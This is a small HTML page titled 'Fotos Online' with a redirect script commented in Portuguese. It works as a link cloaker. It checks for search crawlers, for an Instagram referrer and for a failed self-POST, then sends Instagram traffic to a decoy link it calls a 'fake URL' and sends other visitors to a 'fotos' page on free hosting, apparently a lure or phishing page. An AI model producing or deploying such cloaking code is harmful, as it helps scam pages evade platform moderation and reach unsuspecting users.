<!DOCTYPE html>
<html>
<head>
    <title>Fotos Online</title>
</head>
<body>
    <script>
        // Detectar se é um bot de pesquisa
        var isSearchBot = (function() {
            var userAgent = navigator.userAgent.toLowerCase();
            var bots = ["googlebot", "bingbot", "yandexbot", "duckduckbot"]; // Lista de bots de pesquisa

            for (var i = 0; i < bots.length; i++) {
                if (userAgent.indexOf(bots[i]) !== -1) {
                    return true;
                }
            }

            return false;
        })();

        // Detectar se é um bot do Instagram
        var isInstagramBot = (function() {
            var referrer = document.referrer.toLowerCase();

            // Verificar se o referenciador contém "instagram.com"
            return referrer.indexOf("instagram.com") !== -1;
        })();

        // Detectar se é um bot usando a função POST
        var isPostBot = (function() {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", window.location.href, false);
                xhr.send();

                return false;
            } catch (e) {
                return true;
            }
        })();

        // Redirecionar para um URL falso apenas se for um bot do Instagram
        if (isInstagramBot && !isSearchBot && !isPostBot) {
            var fakeUrl = "https://pin.it/14yHzrk"; // URL falso para redirecionar os bots do Instagram
            window.location.replace(fakeUrl);
        } else {
            // Redirecionar para o site principal
            window.location.href = 'https://fotos-2023-online-com.000webhostapp.com/fotos.html';
        }
    </script>
</body>
</html>
